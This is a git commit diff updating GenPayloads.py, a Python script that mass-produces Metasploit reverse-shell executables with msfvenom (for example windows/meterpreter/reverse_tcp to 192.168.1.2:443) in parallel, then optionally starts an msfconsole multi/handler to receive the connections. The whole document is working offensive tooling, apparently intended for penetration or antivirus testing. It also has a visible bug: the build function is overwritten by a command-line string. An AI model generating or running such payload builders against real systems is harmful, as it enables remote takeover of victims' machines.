1980fb969f6889cfcaf20b3fd4d3802ca5ae1da2
Chris Campbell <obscuresec@gmail.com>
2013-08-13 15:35:24 -0400

    Update GenPayloads.py
    Fixed bug and use multiprocessing

--- GenPayloads.py
+++ GenPayloads.py
@@ -1,49 +1,68 @@
 #!/usr/bin/python
 #
 # GenPayloads.py
-# Simple python script to generate a number of metasploit payload binaries and then start a handler for testing
-# ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 100 
+# Simple python script to generate a number of metasploit payload binaries and then optionally start a handler for testing
+# ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 100 no
 #
 # by Chris Campbell (obscuresec)
 # original idea from Skip Duckwall (passingthehash)
-import os
 import sys
 import subprocess
+from multiprocessing import Pool
 
 #write a resource file and call it
 def build(payload,lhost,lport):
-    options = "use multi/handler\n"
-    options += "set payload %s\n" % (payload)
-    options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
-    options += "set ExitOnSession false\n"
-    options += "exploit -j\n"
-    filewrite = file("listener.rc", "w")
-    filewrite.write(options)
-    filewrite.close()
-    subprocess.Popen("msfconsole -r listener.rc", shell=True).wait()
-
+    try:
+        options = "use multi/handler\n"
+        options += "set payload %s\n" % (payload)
+        options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
+        options += "set ExitOnSession false\n"
+        options += "exploit -j\n"
+        filewrite = file("listener.rc", "w")
+        filewrite.write(options)
+        filewrite.close()
+        subprocess.Popen("msfconsole -r listener.rc", shell=True).wait()
+    except:
+        return '*error*'
+      
 #generate payloads with msfvenom
-def gen(payload,lhost,lport,num):
-    processes = set()
-    max_processes = 10
-    for x in range(0, int(num)):      
-        filename = "payload_%s_%s" % (lport,x)
-        venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s" % (payload,lhost,lport,filename)
-        processes.add(subprocess.Popen(venom, shell=True))
-        if len(processes) >= max_processes:
-            os.wait()
-            processes.difference_update(p for p in processes if p.poll() is not None)
+def generate(command):
+    try:
+        print 'Running...', command
+        subprocess.Popen(command, shell=True).wait() 
+    except:
+        return '*error*'
 
-#grab args
-try:    
-    payload = sys.argv[1]
-    lhost = sys.argv[2]
-    lport = sys.argv[3]
-    num = sys.argv[4]
+#use multiprocessing to safely thread 15 processes
+def multi(payload,lhost,lport,num):
+    try:
+        commands = []
+        for x in range(0, int(num)):      
+            venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > payload_%s_%s" % (payload,lhost,lport,lport,x)
+            commands.append(venom)       
+        pool = Pool(processes=15)
+        run = pool.map(generate, commands)
+        #pool.map(test, commands)
+        pool.close()
+        print 'Completed generating payloads.'
+    except:
+        return '*error*'
+        
+if __name__ == '__main__':
+    #grab args
+    try:    
+        payload = sys.argv[1]
+        lhost = sys.argv[2]
+        lport = sys.argv[3]
+        num = sys.argv[4]
+        build = sys.argv[5]
 
-    gen(payload,lhost,lport,num)
-    build(payload,lhost,lport)
+        multi(payload,lhost,lport,num)
+        
+        if sys.argv[5] == 'yes':
+            build(payload,lhost,lport)
 
-#index error
-except IndexError:
-    print "python GenPayloads.py payload lhost lport number"
+    #index error
+    except IndexError:
+        print "python GenPayloads.py payload lhost lport number [build]"
+        print "ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 1000 yes"
